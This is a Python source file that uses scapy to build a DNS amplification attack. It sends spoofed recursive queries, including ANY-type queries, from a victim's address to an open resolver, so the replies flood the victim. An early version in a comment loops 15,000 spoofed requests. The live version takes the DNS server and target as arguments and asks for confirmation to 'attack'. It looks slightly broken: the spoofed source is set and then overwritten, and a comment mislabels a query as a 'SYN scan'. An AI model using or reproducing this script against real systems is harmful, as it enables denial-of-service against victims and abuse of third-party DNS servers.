'''#!/ usr/bin/python
# next two lines are used to remove warning of ipv6

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

# taking input the victim ’ s and DNS server ’ s address

victimIP = input("Please enter the IP address for the victim:")
dnsIP = input("Please enter the IP address for the misconfigured DNS:")

i=0

# creating a layer 3 socket at ethernet interface

s = conf.L3socket(iface='eth0')

# continuously sending DNS requests
while (i < 15000):
	s.send(IP(dst=dnsIP,src=victimIP)/UDP(sport=5353, dport=53)/DNS(rd=1,qd=DNSQR(qname="google.com")))
	i=i +1;'''

from scapy.all import *

from argparse import ArgumentParser
#!/ usr/bin/python
# next two lines are used to remove warning of ipv6

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *
from scapy.layers.inet import IP
from scapy.layers.inet import UDP

import sys
import os

def construct_IP(DNSaddr):
    # Construct IP packet
    ip = IP()
    ip.dst = DNSaddr
    ip.show()
    return ip

def construct_UDP():
    # Construct UDP packet
    udp = UDP()
    udp.display()
    return udp

def construct_DNS():
    # Construct DNS packet
    dns = DNS()
    dns.rd = 1
    dns.qdcount = 1
    dns.display()
    return dns

def construct_DNSQR(qtype=255, qname = 'qq.com'):
    # Construct DNS Question Record
    q = DNSQR()
    q.qtype = qtype
    q.qname = qname
    q.display()
    return q

def Set_UP(ip, udp, dns, q, target = '127.0.0.1'):
    # Set DNS Question Record in DNS packet
    dns.qd = q

    # Concencate
    r = (ip/udp/dns)
    r.display()
    # SYN scan
    sr1(r)

    # Set up r
    r.src = target
    r = (ip/udp/dns)
    r.display()
    return r

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument("-D", "--DNS-server", help="Assign specific DNS server", dest="D")
    parser.add_argument("-T", "--Target", help="target server", dest="T")
    args = parser.parse_args()
    print('DNS server: %s' %args.D)
    print('Target: %s' %args.T)

    ip = construct_IP(DNSaddr = args.D)
    udp = construct_UDP()
    dns = construct_DNS()
    q = construct_DNSQR()

    r = Set_UP(ip, udp, dns, q, args.T)

    a = 'Y'
    a = input('Are you sure you want to attack ? [Y]/N')
    if (a == 'Y'):
        send(r)
    else:
        exit()